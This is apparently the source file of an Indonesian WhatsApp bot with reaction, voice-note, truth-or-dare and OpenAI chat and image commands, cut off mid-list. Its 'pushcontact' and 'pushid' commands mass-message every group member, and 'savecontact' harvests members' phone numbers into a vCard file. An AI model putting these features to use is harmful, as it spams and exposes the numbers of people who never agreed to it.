/*
╔┓┏╦━━╦┓╔┓╔━━╗╔╗
║┗┛║┗━╣┃║┃║╯╰║║║
║┏┓║┏━╣┗╣┗╣╰╯║╠╣
╚┛┗╩━━╩━╩━╩━━╝╚╝
*/
//=================================================//
const { BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
areJidsSameUser, 
getContentType 
} = require("@adiwajshing/baileys");
const fs = require("fs");
const util = require("util");
const chalk = require("chalk");
const crypto = require("crypto")
const { platform } = require("process");
const { Configuration, OpenAIApi } = require("openai");
let setting = require("./AvA/FrenZyra-KEY.json");
//=================================================//
const getGroupAdmins = (participants) => {
let admins = []
for (let i of participants) {
i.admin === "superadmin" ? admins.push(i.id) :i.admin === "admin" ? admins.push(i.id) : ''
}
return admins || []
}
const contacts = JSON.parse(fs.readFileSync("./HuH/Contact.json"))
//=================================================//
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//=================================================//
require("./Settings");
module.exports = rezadevv = async (FrenZyra, m, chatUpdate, store) => {
try {
var body =
m.mtype === "conversation"
? m.message.conversation
: m.mtype == "imageMessage"
? m.message.imageMessage.caption
: m.mtype == "videoMessage"
? m.message.videoMessage.caption
: m.mtype == "extendedTextMessage"
? m.message.extendedTextMessage.text
: m.mtype == "buttonsResponseMessage"
? m.message.buttonsResponseMessage.selectedButtonId
: m.mtype == "listResponseMessage"
? m.message.listResponseMessage.singleSelectReply.selectedRowId
: m.mtype == "templateButtonReplyMessage"
? m.message.templateButtonReplyMessage.selectedId
: m.mtype === "messageContextInfo"
? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text
: "";
//=================================================//
var budy = typeof m.text == "string" ? m.text : "";
var prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π©®Δ^βα¦|/\\©^]/gi) : ''
//=================================================//
const isCmd2 = body.startsWith(prefix);
const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
const botNumber = await FrenZyra.decodeJid(FrenZyra.user.id);
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const itsMe = m.sender == botNumber ? true : false;
let text = (q = args.join(" "));
const arg = budy.trim().substring(budy.indexOf(" ") + 1);
const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
//=================================================//
const from = m.chat;
//const reply = m.reply;
const sender = m.sender;
const ZYY = chatUpdate.messages[0];
const isContacts = contacts.includes(sender)
//=================================================//
const color = (text, color) => {
return !color ? chalk.green(text) : chalk.keyword(color)(text);
};
//=================================================//
const groupMetadata = m.isGroup ? await FrenZyra.groupMetadata(m.chat).catch((e) => {}) : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//=================================================//
let argsLog = budy.length > 30 ? `${q.substring(0, 30)}...` : budy;
//=================================================//
if (isCmd2 && !m.isGroup) {
console.log(chalk.black(chalk.bgWhite("⫹ 𝙿𝙴𝚂𝙰𝙽 ⫺")), 
color(argsLog, "turquoise"), 
chalk.magenta("𝙵𝚁𝙾𝙼"), 
chalk.green(pushname), 
chalk.yellow(`⫹ ${m.sender.replace("@s.whatsapp.net", "")} ⫺`));
} else if (isCmd2 && m.isGroup) {
console.log(
chalk.black(chalk.bgWhite("⫹ 𝙿𝙴𝚂𝙰𝙽 ⫺")), 
color(argsLog, "turquoise"),
chalk.magenta("𝙵𝚁𝙾𝙼"),
chalk.green(pushname),
chalk.yellow(`⫹ ${m.sender.replace("@s.whatsapp.net", "")} ⫺`));
chalk.blueBright("IN"),
chalk.green(groupName)
);
}
//=================================================//
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}

if (!FrenZyra.public) {
if (!m.key.fromMe) return
}
//=================================================//
async function ClockLoad() {
var TvT = [
"🕛",
"🕧",
"🕐",
"🕜",
"🕑",
"🕝",
"🕒",
"🕞",
"🕓",
"🕟",
"🕔",
"🕠",
"🕕",
"🕡",
"🕖",
"🕢",
"🕗",
"🕣",
"🕘",
"🕤",
"🕙",
"🕥",
"🕚",
"🕦"
]
let { key } = await FrenZyra.sendMessage(from,
{ text: 'Ϟ 𝖑𝖔𝖆𝖉𝖎𝖓𝖌...' })
for (let i = 0; i < TvT.length; i++) {
await FrenZyra.sendMessage(from, {
text: TvT[i], 
edit: key }, 
{ quoted: m });
}
}
//=================================================//
async function Loading() {
var ViV = [
"*[ ⚠︎ ] 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝚂𝚈𝚂𝚃𝙴𝙼 [ ⚠︎ ]*",
"*《 █▒▒▒▒▒▒▒▒▒ 》10%*",
"*《 ██▒▒▒▒▒▒▒▒ 》20%*",
"*《 ███▒▒▒▒▒▒▒ 》30%*",
"*《 ████▒▒▒▒▒▒ 》40%*",
"*《 █████▒▒▒▒▒ 》50%*",
"*《 ██████▒▒▒▒ 》60%*",
"*《 ███████▒▒▒ 》70%*",
"*《 ████████▒▒ 》80%*",
"*《 █████████▒ 》90%*",
"*《 ██████████ 》100%*",
"*[ ⚠︎ ]︎ 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 [ ⚠︎ ]*"
]
let { key } = await FrenZyra.sendMessage(from,
{ text: '[ ⚠︎ ] 𝚁𝙴𝙱𝙾𝙾𝚃𝙸𝙽𝙶 𝚂𝚈𝚂𝚃𝙴𝙼...' })
for (let i = 0; i < ViV.length; i++) {
await FrenZyra.sendMessage(from, {
text: ViV[i], 
edit: key }, 
{ quoted: m });
}
}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await FrenZyra.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await FrenZyra.getName(i + '@s.whatsapp.net')}\n
FN:${await FrenZyra.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:FrenzyKozume@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://www.youtube.com/@SpaceBackrooms\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}


//=================================================//
if (m.sender.startsWith('212')) return FrenZyra.updateBlockStatus(m.sender, 'block')
//=================================================//
VvV = fs.readFileSync('./MwM/Menu.jpg')
const reply = (teks) => { 
FrenZyra.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "𝙵𝚁𝙴𝙽𝚉𝚈𝚁𝙰 𝙼𝚄𝙻𝚃𝙸 𝙳𝙴𝚅𝙸𝙲𝙴", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": VvV, 
"mediaUrl": "https://instagram.com/ItsukaFrenzy", 
"sourceUrl": "https://youtube.com/@SpaceBackrooms" }}}, 
{ quoted: m })}
//=================================================//
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
//=================================================//
//=================================================//
if (isCmd2) {
switch (command) {
case "🗿": {
const reactionMessage = {
react: {
text: "🗿", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🐦": {
const reactionMessage = {
react: {
text: "🐦", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🐧": {
const reactionMessage = {
react: {
text: "🐧", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "☕": {
const reactionMessage = {
react: {
text: "☕", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "💀": {
const reactionMessage = {
react: {
text: "💀", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🤖": {
const reactionMessage = {
react: {
text: "🤖", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "⚡": {
const reactionMessage = {
react: {
text: "⚡", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🥶": {
const reactionMessage = {
react: {
text: "🥶", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🥵": {
const reactionMessage = {
react: {
text: "🥵", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🤓": {
const reactionMessage = {
react: {
text: "🤓", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "👽": {
const reactionMessage = {
react: {
text: "👽", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "👾": {
const reactionMessage = {
react: {
text: "👾", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🔥": {
const reactionMessage = {
react: {
text: "🔥", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🛐": {
const reactionMessage = {
react: {
text: "🛐", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🇮🇩": {
const reactionMessage = {
react: {
text: "🇮🇩", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "🤡": {
const reactionMessage = {
react: {
text: "🤡", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "❤️": {
const reactionMessage = {
react: {
text: "❤️", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "bot️": {
const reactionMessage = {
react: {
text: "🤖️", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "👍️": {
const reactionMessage = {
react: {
text: "👍", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "lol️": {
const reactionMessage = {
react: {
text: "👁️️", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "push":
case "contactpush":
case "pushcontact" : {
await ClockLoad()
if (!text) return m.reply(`Example ${prefix}${command} Hello`)
if (!isCreator) return m.reply(mess.FrenZyra)
if (!m.isGroup) return m.reply(mess.Group)
if (!isBotAdmins) return m.reply(mess.UnAdmin)
if (!isAdmins) throw m.reply(mess.Admin)
let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let count = get.length;
let sentCount = 0;
m.reply('*_Sedang Push Kontak..._*');
for (let i = 0; i < get.length; i++) {
setTimeout(function() {
FrenZyra.sendMessage(get[i], { text: text });
count--;
sentCount++;
if (count === 0) {
m.reply(`*_Berhasil Push Kontak:_*\n*_Jumlah Pesan Terkirim: ${sentCount}_*`)
}
}, i * 1000); 
}
}
break
case "idpush":
case "pushid": {
await ClockLoad()
if (!isCreator) return m.reply(mess.FrenZyra)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return m.reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await FrenZyra.groupMetadata(idgc).catch((e) => {m.reply(e)})
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
m.reply('*_Sedang Push ID..._*')
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
FrenZyra.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
m.reply(`*_Semua pesan telah dikirim!_*:\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 6000);
}
}
break
case "contactsave":
case "savecontact": {
await Loading()
if (!isCreator) return m.reply(mess.FrenZyra)
if (!text) return reply(`Exampale: ${prefix + command} idgroup`)
const groupMetadataa = !m.isGroup? await FrenZyra.groupMetadata(`${text}`).catch(e => {reply(e)}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const getdata = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(mess.Wait)
for (let member of getdata) {
if (isContacts) return
contacts.push(member)
fs.writeFileSync('./HuH/Contact.json', JSON.stringify(contacts))
} try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"",
].join("\n");
return vcard;
}).join("");
fs.writeFileSync("./HuH/Contact.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await FrenZyra.sendMessage(from, { document: fs.readFileSync("./HuH/Contact.vcf"), fileName: "contacts.vcf", caption: `_*${mess.Success}*_\n\n_Group:_ *_${groupMetadataa.subject}_*`, mimetype: "text/vcard", }, { quoted: m })
fs.writeFileSync("./HuH/Contact.vcf", "");
contacts.splice(0, contacts.length)
fs.writeFileSync("./HuH/Contact.json", JSON.stringify(contacts))
}
}
break
case "idgc":
case "groupid":
case "idgroup":
case "getidgroup":
case "getidgc": {
await Loading()
if (!isCreator) return reply(mess.FrenZyra)
if (!m.isGroup) return reply(mess.Group)
reply(from)
}
break
case "rezy":
case "rezi":
case "zi":
case "zii":
case "zy":
case "zyy":
case "reji":
case "rejii":
case "rezyy":
case "rezii":
case "ji":
case "jii":
case "ai":
case "chat":
case "chatgpt":
case "gptpro":
case "openai":
case "chatbot":
case "frenzy":
case "frenzyy":
case "autobot":
case "gpt":
case "chatgpt4":
case "ask":
case "askbot":
case "chatsimi": {
try {
var Chat = fs.readFileSync(`${pickRandom([
'./TwT/Ada Apa.mp3',
'./TwT/Ada Apa Kak.mp3',
'./TwT/Iya Kak.mp3',
'./TwT/Kenapa Kak.mp3',
'./TwT/Oi.mp3',
'./TwT/Kaga Ada.mp3'])}`)
if (!text) return await FrenZyra.sendMessage(m.chat,
{audio: Chat,
mimetype: 'audio/mpeg',
ptt:true},
{ quoted: m })
const configuration = new Configuration({
apiKey: setting.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createChatCompletion({
model: "gpt-3.5-turbo",
messages: [{role: "user", content: text}],
});
Zyy = `${sender}`
OuO = fs.readFileSync(`${pickRandom([
'./OuO/EX1.png',
'./OuO/EX2.png',
'./OuO/EX3.png',
'./OuO/EX4.png',
'./OuO/EX5.png',
'./OuO/EX6.png',
'./OuO/EX7.png',
'./OuO/EX8.png',
'./OuO/EX9.png',
'./OuO/EX10.png'])}`)
FrenZyra.sendMessage(from, {
image: OuO,
caption: `*${response.data.choices[0].message.content}*`, 
mentions: [Zyy]
},
{ quoted: m })
//reply(`*${response.data.choices[0].message.content}*`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply("𝖘𝖊𝖕𝖊𝖗𝖙𝖎𝖓𝖞𝖆 𝖆𝖉𝖆 𝖞𝖆𝖓𝖌 𝖊𝖗𝖗𝖔𝖗 𝖙𝖚𝖆𝖓\n"+ error.message);
}
}
}
break
case "frenzydalle":
case "imgdalle":
case "imgbot":
case "createimg":
case "makeimg":
case "summonimg":
case "imagebot":
case "draw":
case "drawimg":
case "gambar":
case "aidalle":
case "images":
case "botdalle": {
try {
if (!text) return reply(`𝕱𝖗𝖊𝖓𝖟𝖞 𝖇𝖔𝖙 𝖎𝖘 𝖔𝖓𝖑𝖎𝖓𝖊`);
const configuration = new Configuration({
apiKey: setting.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
FrenZyra.sendImage(from, response.data.data[0].url, text, ZYY);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply("𝖘𝖊𝖕𝖊𝖗𝖙𝖎𝖓𝖞𝖆 𝖆𝖉𝖆 𝖞𝖆𝖓𝖌 𝖊𝖗𝖗𝖔𝖗 𝖙𝖚𝖆𝖓\n"+ error.message);
}
}
}
break
case "getsesi":
case "sesiget":
case "sessiget":
case "getsession":
case "getsessibot":
case "getsesibot":
case "getsessi": {
if (!isCreator) return Reply(mess.FrenZyra)
reply('Tunggu Sebentar, Sedang mengambil file sesi mu')
let Session = fs.readFileSync('./XD/creds.json')
FrenZyra.sendMessage(m.chat, {
document: Session,
mimetype: 'application/json',
fileName: 'creds.json'
}, 
{ quoted: m })
}
break
case "myip":
case "ipbot":
case "ipaddress":
case "frenzyip": {
if (!isCreator) return reply(mess.FrenZyra)
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
reply("🔎 My public IP address is: " + ip);
})
})
}
break
case 'assalamualaikum':
case 'asalamualaikum':
case 'assalamu\'alaikum':
case 'samlekom':
case 'samlikum':
case 'asalamu\'alaikum': {
var Salam = fs.readFileSync('./TwT/Salam.mp3')
await FrenZyra.sendMessage(m.chat,
{audio: Salam,
mimetype: 'audio/mpeg',
ptt:true },
{ quoted: m })
}
break
case 'woii':
case 'woy':
case 'woyy':
case 'woe':
case 'woee':
case 'woi': {
var ApaSih = fs.readFileSync('./TwT/Frenzy MD.mp3')
await FrenZyra.sendMessage(m.chat,
{audio: ApaSih,
mimetype: 'audio/mpeg',
ptt:true },
{ quoted: m })
}
break
case 'p':
case 'pp':
case 'ppp': {
var Atheis = fs.readFileSync(`${pickRandom(['./TwT/Ngomong Apaan Sih.mp3', './TwT/Siapa.mp3'])}`)
await FrenZyra.sendMessage(m.chat,
{audio: Atheis,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "ao":
case "aok":
case "sip":
case "sipp": {
const reactionMessage = {
react: {
text: "👌🏻", 
key: m.key
}
}
FrenZyra.sendMessage(sender, reactionMessage)
}
break
case "haii":
case "hay":
case "hayy":
case "halo":
case "hallo":
case "haloo":
case "halloo":
case "alo":
case "aloo":
case "allo":
case "alloo":
case "aalo":
case "aalloo":
case "hello":
case "helloo":
case "helo":
case "heloo":
case "hai": {
const tekss = ("ya", "iya")
if (args[1] === `${tekss}`) return reply("Bacot")
var Sambut = fs.readFileSync(`${pickRandom(['./TwT/Gambare.mp3', './TwT/Asautegondalimas.mp3', './TwT/Moshi Mossh.mp3', './TwT/Moshi Moshi.mp3'])}`)
await FrenZyra.sendMessage(m.chat,
{audio: Sambut,
mimetype: 'audio/mpeg',
ptt:true },
{ quoted: m })
}
break
case "araara":
case "ara": {
var ara = fs.readFileSync(`${pickRandom(['./TwT/Ara Ara.mp3', './TwT/Ara Ara GobloQ.mp3'])}`)
await FrenZyra.sendMessage(m.chat,
{audio: ara,
mimetype: 'audio/mpeg',
ptt:true},
{ quoted: m })
}
break
case "anjirr":
case "njir":
case "njirr":
case "bjir":
case "bjirr":
case "bjier":
case "bjierr":
case "anjer":
case "anjerr":
case "njier":
case "njierr":
case "ancrit":
case "ancritt":
case "bejir":
case "bejirr":
case "anjir": {
var anjir = fs.readFileSync(`${pickRandom(['./TwT/Ara Ara.mp3', './TwT/Ara Ara GobloQ.mp3'])}`)
await FrenZyra.sendMessage(m.chat,
{audio: anjir,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "anjing": 
case "anjg": 
case "ajg": 
case "babi": 
case "bbi": 
case "b4b1": 
case "bab1": 
case "njing": 
case "jing": 
case "sat": 
case "bgst": 
case "bangst": 
case "pukimak": 
case "kimak": 
case "kimek": 
case "kontol": 
case "kntl": 
case "bangsat": 
case "kntol": 
case "kintil":
case "mmek": 
case "mmq": 
case "memek": 
case "memeq": 
case "ppk": 
case "ppek": 
case "ppq": 
case "puki": 
case "puqi": 
case "asu": 
case "asw": 
case "bangke":
case "bangkek":
case "asuu": 
case "jancok": 
case "jnck": 
case "jancokk": 
case "pler": 
case "poler": 
case "setan": 
case "jahanam": {
var Toxic = fs.readFileSync(`${pickRandom([
'./TwT/Ara Ara.mp3',
'./TwT/Ara Ara GobloQ.mp3'])}`)
FrenZyra.sendMessage(m.chat,
{audio: Toxic,
mimetype: 'audio/mpeg',
ptt:true}, 
{ quoted: m })
}
break
case "reaction":
case "react": {
reactionMessage = {
react: {
text: args[0], 
key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
FrenZyra.sendMessage(m.chat, reactionMessage)
}
break
case "dare": {
const dare =[
"Berani tidak kamu makan cabai rawit tanpa minum air?",
"Berani tidak kamu menari Gangnam Style di depan orang banyak?",
"Berani tidak kamu mengirim pesan cinta ke gebetan kamu?",
"Berani tidak kamu memakai pakaian terbalik sehari penuh?",
"Berani tidak kamu menyanyikan lagu favorit kamu dengan suara falsetto?",
"Berani tidak kamu meminjam uang dari teman dan tidak mengembalikannya?",
"Berani tidak kamu mencium pipi orang yang pertama kali kamu lihat di jalan?",
"Berani tidak kamu mengaku sebagai fans berat Justin Bieber?",
"Berani tidak kamu memakai kostum badut dan berjalan-jalan di mall?",
"Berani tidak kamu memotong rambut kamu sendiri tanpa cermin?",
"Berani tidak kamu menonton film horor sendirian di malam hari?",
"Berani tidak kamu berbohong kepada orang tua kamu tentang nilai sekolah kamu?",
"Berani tidak kamu memakan makanan yang sudah kadaluarsa?",
"Berani tidak kamu mengganti nama kamu di media sosial menjadi nama lucu?",
"Berani tidak kamu berpura-pura sakit perut dan pergi ke kamar mandi saat ada tes?",
"Berani tidak kamu menggambar wajah kamu sendiri dengan pensil warna?",
"Berani tidak kamu mengucapkan selamat ulang tahun kepada orang yang tidak kamu kenal?",
"Berani tidak kamu membeli barang yang tidak kamu butuhkan dengan uang jajan kamu?",
"Berani tidak kamu memakai kaus kaki yang berbeda warna?",
"Berani tidak kamu menirukan suara hewan saat berbicara dengan orang lain?",
"Berani tidak kamu memasang foto kamu yang jelek di profil media sosial kamu?",
"Berani tidak kamu mengatakan hal yang tidak sopan kepada guru atau atasan kamu?",
"Berani tidak kamu meminum air garam?",
"Berani tidak kamu memakai make up yang berlebihan?",
"Berani tidak kamu menggigit es batu?",
"Berani tidak kamu memakai baju renang dan berenang di kolam umum?",
"Berani tidak kamu memeluk boneka beruang besar di toko mainan?",
"Berani tidak kamu memakan permen yang pahit atau asin?",
"Berani tidak kamu mengirim foto selfie kamu yang lucu ke grup chat?",
"Berani tidak kamu memakai topeng hantu dan menakut-nakuti teman kamu?",
"Berani tidak kamu memakai sepatu hak tinggi dan berlari di lapangan?",
"Berani tidak kamu memasukkan jari kamu ke lubang hidung?",
"Berani tidak kamu memakai wig rambut panjang dan berpura-pura menjadi penyanyi?",
"Berani tidak kamu memakai kacamata hitam di dalam ruangan?",
"Berani tidak kamu memakan pisang dengan kulitnya?",
"Berani tidak kamu memakai pakaian adat daerah dan berfoto di depan monumen?",
"Berani tidak kamu memakai sarung dan ikat kepala?",
"Berani tidak kamu memakai anting-anting yang besar dan berkilau?",
"Berani tidak kamu memakai celana dalam di atas celana panjang?",
"Berani tidak kamu memakai topi Santa Claus di bulan Juli?",
"Berani tidak kamu memakai jaket bulu di musim panas?",
"Berani tidak kamu memakai celana pendek di musim dingin?",
"Berani tidak kamu memakai dasi kupu-kupu dan kemeja kotak-kotak?",
"Berani tidak kamu memakai rok mini dan kaos oblong?",
"Berani tidak kamu memakai bando bunga dan gelang manik-manik?",
"Berani tidak kamu memakai kalung bawang putih dan cincin batu akik?",
"Berani tidak kamu memakai jas dan celana jeans?",
"Berani tidak kamu memakai kaos bergambar wajah kamu sendiri?",
"Berani tidak kamu memakai kaus kaki di tangan dan sarung tangan di kaki?",
"Berani tidak kamu memakai baju tidur dan piyama di sekolah atau kantor?",
"Berani tidak kamu memakai baju olahraga dan sepatu kets di pesta?",
"Berani tidak kamu memakai baju renang dan sandal jepit di bioskop?",
"Berani tidak kamu memakai baju rapi dan sepatu pantofel di pantai?",
"Berani tidak kamu memakai baju transparan dan bra warna-warni?",
"Berani tidak kamu memakai baju berenda dan celana dalam berenda?",
"Berani tidak kamu memakai baju berlogo merek terkenal dan celana robek-robek?",
"Berani tidak kamu memakai baju bergaris-garis dan celana bermotif?",
"Berani tidak kamu memakai baju berwarna merah dan celana berwarna hijau?",
"Berani tidak kamu memakai baju berwarna pink dan celana berwarna ungu?",
"Berani tidak kamu memakai baju berwarna kuning dan celana berwarna biru?",
"Berani tidak kamu memakai baju berwarna hitam dan celana berwarna putih?",
"Berani tidak kamu memakai baju berwarna coklat dan celana berwarna abu-abu?",
"Berani tidak kamu memakai baju berwarna oranye dan celana berwarna magenta?",
"Berani tidak kamu memakai baju berwarna emas dan celana berwarna perak?",
"Berani tidak kamu memakai baju berwarna neon dan celana berwarna pastel?",
"Berani tidak kamu memakai baju berwarna gelap dan celana berwarna terang?",
"Berani tidak kamu memakai baju berwarna terang dan celana berwarna gelap?",
"Berani tidak kamu memakai baju berukuran kecil dan celana berukuran besar?",
"Berani tidak kamu memakai baju berukuran besar dan celana berukuran kecil?",
"Berani tidak kamu memakai baju lengan panjang dan celana pendek?",
"Berani tidak kamu memakai baju lengan pendek dan celana panjang?",
"Berani tidak kamu memakai baju tanpa kancing dan celana tanpa resleting?",
"Berani tidak kamu memakai baju tanpa kerah dan celana tanpa kantong?",
"Berani tidak kamu memakai baju tanpa lengan dan celana tanpa pinggang?",
"Berani tidak kamu memakai baju tanpa lubang lengan dan celana tanpa lubang kaki?",
"Berani tidak kamu memakai baju dengan banyak kancing dan celana dengan banyak resleting?",
"Berani tidak kamu memakai baju dengan banyak kerah dan celana dengan banyak kantong?",
"Berani tidak kamu memakai baju dengan banyak lengan dan celana dengan banyak pinggang?",
"Berani tidak kamu memakai baju dengan banyak lubang lengan dan celana dengan banyak lubang kaki?",
"Berani tidak kamu memakai baju dengan banyak pola dan celana dengan banyak corak?",
"Berani tidak kamu memakai baju dengan banyak tulisan dan celana dengan banyak gambar?",
"Berani tidak kamu memakai baju dengan banyak hiasan dan celana dengan banyak aksesoris?",
"Berani tidak kamu memakai baju dengan banyak lubang dan celana dengan banyak sobekan?",
"Berani tidak kamu memakai baju dengan banyak noda dan celana dengan banyak kotoran?",
"Berani tidak kamu memakai baju dengan banyak lipatan dan celana dengan banyak kerutan?",
"Berani tidak kamu memakai baju dengan banyak benang dan celana dengan banyak jahitan?",
"Berani tidak kamu memakai baju dengan banyak kancing palsu dan celana dengan banyak resleting palsu?",
"Berani tidak kamu memakai baju dengan banyak kerah palsu dan celana dengan banyak kantong palsu?",
"Berani tidak kamu memakai baju dengan banyak lengan palsu dan celana dengan banyak pinggang palsu"
]
const frenzydare = dare[Math.floor(Math.random() * dare.length)]
Dare = fs.readFileSync('./MwM/Thumbnail.jpg')
FrenZyra.sendMessage(from, {
image: Dare, 
caption: `*${frenzydare}*` }, 
{ quoted: m })
}
break
case "truth": {
const truth =[
"Siapa orang yang paling kau kagumi?",
"Apa hal yang paling kau takutkan?",
"Kapan terakhir kali kau menangis?",
"Apa hal yang paling kau sukai dari dirimu sendiri?",
"Kapan terakhir kali kau berbohong?",
"Apa hal yang paling kau benci dari dirimu sendiri?",
"Siapa orang yang paling kau cintai?",
"Apa hal yang paling kau sesali dalam hidupmu?",
"Kapan terakhir kali kau tertawa terbahak-bahak?",
"Apa hal yang paling kau inginkan saat ini?",
"Siapa orang yang paling kau benci?",
"Apa hal yang paling kau banggakan dalam hidupmu?",
"Kapan terakhir kali kau marah?",
"Apa hal yang paling kau malukan dalam hidupmu?",
"Siapa orang yang paling kau sayangi?",
"Apa hal yang paling kau syukuri dalam hidupmu?",
"Kapan terakhir kali kau bahagia?",
"Apa hal yang paling kau dambakan dalam hidupmu?",
"Siapa orang yang paling kau rindukan?",
"Apa hal yang paling kau nikmati dalam hidupmu?",
"Kapan terakhir kali kau sedih?",
"Apa hal yang paling kau benci dalam hidupmu?",
"Siapa orang yang paling kau percayai?",
"Apa hal yang paling kau sukai dalam hidupmu?",
"Kapan terakhir kali kau cemburu?",
"Apa hal yang paling kau harapkan dalam hidupmu?",
"Siapa orang yang paling kau iri?",
"Apa hal yang paling kau cintai dalam hidupmu?",
"Kapan terakhir kali kau kecewa?",
"Apa hal yang paling kau impikan dalam hidupmu?",
"Siapa orang yang paling kau hormati?",
"Apa hal yang paling kau nantikan dalam hidupmu?",
"Kapan terakhir kali kau berterima kasih?",
"Apa hal yang paling kau bingungkan dalam hidupmu?",
"Siapa orang yang paling kau pengen bertemu?",
"Apa hal yang paling kau herankan dalam hidupmu?",
"Kapan terakhir kali kau kaget?",
"Apa hal yang paling kau senangi dalam hidupmu?",
"Siapa orang yang paling kau pengen kenal?",
"Apa hal yang paling kau pelajari dalam hidupmu?",
"Kapan terakhir kali kau belajar sesuatu yang baru?",
"Apa hal yang paling kau kuasai dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi teman?",
"Apa hal yang paling kau butuhkan dalam hidupmu?",
"Kapan terakhir kali kau berbagi sesuatu dengan orang lain?",
"Apa hal yang paling kau miliki dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi saudara?",
"Apa hal yang paling kau korbankan dalam hidupmu?",
"Kapan terakhir kali kau berkorban untuk orang lain?",
"Apa hal yang paling kau pertahankan dalam hidupmu?",
"Siapa orang yang paling kau pengen jadi pasangan?",
"Apa hal yang paling kau ubah dalam hidupmu?",
"Kapan terakhir kali kau mengubah sesuatu dalam dirimu?",
